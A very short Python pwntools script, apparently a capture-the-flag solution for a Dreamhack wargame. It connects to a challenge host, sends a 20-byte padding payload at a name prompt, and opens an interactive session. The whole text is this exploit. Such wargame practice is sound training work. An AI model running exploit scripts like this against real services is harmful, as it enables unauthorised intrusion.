from pwn import *

p=remote("host3.dreamhack.games",12380)

payload=b"A"*0x14

p.sendlineafter("Name: ",payload)

p.interactive()